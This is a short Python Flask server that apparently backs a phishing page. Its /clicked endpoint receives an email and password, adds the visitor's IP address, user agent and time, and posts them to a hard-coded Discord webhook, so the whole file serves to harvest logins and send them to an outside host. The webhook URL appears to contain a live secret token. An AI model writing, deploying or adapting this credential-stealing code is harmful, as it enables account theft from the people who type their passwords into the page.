from flask import Flask, request,render_template
import requests
import datetime
from flask_cors import CORS


app = Flask(__name__, template_folder=".")

CORS(app, resources={
    r"/clicked": {"origins": ["http://127.0.0.1:5500", "http://localhost:5500"]}
})

WEBHOOK_URL = "https://discord.com/api/webhooks/1418893409044926524/0_WV7aeB_3R-iLotfU5FGMmqsPUhAuzndc98I7Gt1YZzrMxALKow0zyCBq9c_MFNDEWF"
print("start")

@app.get("/")
def index():
    return render_template("index.html")

@app.route("/clicked", methods=["POST"])
def clicked():
    print("x")
    print("🔔 Request received at /clicked")

    # Get JSON data
    data = request.get_json(silent=True) or {}
    print("Received JSON:", data)
    print("saving data")
    # Grab client info
    
    user_ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    email = data.get("email")
    password = data.get("password")
    print(email)
    # Build message for webhook
    payload = {
        "content": f" Button clicked!\n"
                   f" Email: {email}\n"
                   f" Password: {password}\n"
                   f" IP: {user_ip}\n"
                   f" User-Agent: {user_agent}\n"
                   f"  Time: {timestamp}"
    }

    try:
        resp = requests.post(WEBHOOK_URL, json=payload)
        print("Webhook status:", resp.status_code, resp.text)
    except Exception as e:
        print(f"⚠️ Webhook error: {e}")

    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
